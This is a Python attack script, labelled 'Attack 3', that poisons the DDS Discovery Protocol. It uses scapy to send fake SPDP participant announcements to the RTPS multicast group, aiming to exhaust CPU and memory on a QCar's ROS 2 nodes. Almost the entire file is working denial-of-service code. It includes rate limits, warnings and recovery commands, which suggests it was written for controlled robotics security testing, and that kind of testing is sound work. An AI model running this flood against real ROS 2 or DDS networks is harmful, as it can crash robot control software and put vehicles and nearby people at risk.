#!/usr/bin/env python3
"""
dds_ghost.py
============
Attack 3 -- DDS Discovery Protocol Poisoning

Injects fake SPDP (Simple Participant Discovery Protocol) announcements
via raw UDP multicast. Each fake participant causes every real DDS node
on the network to allocate tracking structures and attempt handshakes,
exhausting CPU and memory on the QCar's onboard Jetson.

Usage:
    sudo python3 dds_ghost.py
    sudo python3 dds_ghost.py --count 50 --interval 0.05

Safety limits (enforced):
    Max count    : 100 ghost participants per run
    Min interval : 0.05 seconds between packets

WARNING: Run in short bursts only (10 seconds max recommended).
         Extended flooding can crash the ROS 2 daemon on the QCar.
         Always have the QCar stationary on the floor during this attack.

Requirements:
    pip install scapy
    Must be run as root (raw socket required).
"""

import argparse
import random
import struct
import time
from scapy.all import IP, UDP, Raw, send

# ── DDS SPDP constants ────────────────────────────────────────────────────────
RTPS_MAGIC   = b'RTPS'
RTPS_VERSION = b'\x02\x01'
VENDOR_ID    = b'\x01\x0f'        # eProsima FastDDS
SPDP_MCAST   = '239.255.0.1'
SPDP_PORT    = 7400

# Safety limits
MAX_COUNT    = 100
MIN_INTERVAL = 0.05


def make_guid_prefix():
    """Generate a random 12-byte GUID prefix (fake participant identity)."""
    return bytes([random.randint(0, 255) for _ in range(12)])


def make_spdp_packet(guid_prefix: bytes) -> bytes:
    """
    Minimal RTPS SPDP DATA submessage announcing a fake participant.
    Enough to trigger DDS discovery bookkeeping on all real nodes.
    """
    header = (
        RTPS_MAGIC +
        RTPS_VERSION +
        VENDOR_ID +
        guid_prefix
    )

    # DATA submessage
    submsg_id    = b'\x15'           # DATA
    flags        = b'\x05'           # little-endian + inline QoS
    submsg_len   = struct.pack('<H', 20)
    extra_flags  = b'\x00\x00'
    octets_to_ih = b'\x10\x00'
    reader_id    = b'\x00\x01\x00\xc2'   # SPDP built-in reader
    writer_id    = b'\x00\x01\x00\xc1'   # SPDP built-in writer
    seq_num      = struct.pack('<Q', random.randint(1, 0xFFFF))
    payload      = b'\x00' * 4

    submsg = (
        submsg_id + flags + submsg_len +
        extra_flags + octets_to_ih +
        reader_id + writer_id +
        seq_num + payload
    )
    return header + submsg


def main():
    ap = argparse.ArgumentParser(
        description='Attack 3: DDS Discovery Protocol Poisoning')
    ap.add_argument('--count',    type=int,   default=20,
                    help=f'Ghost participants to inject (max {MAX_COUNT})')
    ap.add_argument('--interval', type=float, default=0.1,
                    help=f'Seconds between packets (min {MIN_INTERVAL})')
    args = ap.parse_args()

    count    = min(args.count, MAX_COUNT)
    interval = max(args.interval, MIN_INTERVAL)

    print()
    print('=' * 55)
    print('  Attack 3: DDS Discovery Protocol Poisoning')
    print('=' * 55)
    print(f'  Target    : {SPDP_MCAST}:{SPDP_PORT} (SPDP multicast)')
    print(f'  Ghosts    : {count} fake participants')
    print(f'  Interval  : {interval:.2f}s between packets')
    print(f'  Duration  : ~{count * interval:.1f}s')
    print()
    print('  Monitor QCar CPU during attack:')
    print('    ssh nvidia@<qcar-ip> "top -bn1 | head -5"')
    print()
    print('  Monitor ROS 2 daemon:')
    print('    ros2 node list   # watch for ghost entries')
    print('=' * 55)
    print()

    t_start = time.time()
    for i in range(count):
        guid    = make_guid_prefix()
        payload = make_spdp_packet(guid)
        pkt     = (
            IP(dst=SPDP_MCAST) /
            UDP(sport=SPDP_PORT, dport=SPDP_PORT) /
            Raw(payload)
        )
        send(pkt, verbose=False)
        print(f'  [{i+1:03d}/{count}] GUID: {guid.hex()}  '
              f'elapsed: {time.time()-t_start:.1f}s')
        time.sleep(interval)

    elapsed = time.time() - t_start
    print()
    print('=' * 55)
    print(f'  Done. Sent {count} ghost SPDP announcements in {elapsed:.1f}s')
    print()
    print('  Check QCar recovery:')
    print('    ros2 daemon stop && ros2 daemon start')
    print('    ros2 topic list   # should return to normal')
    print('=' * 55)


if __name__ == '__main__':
    main()
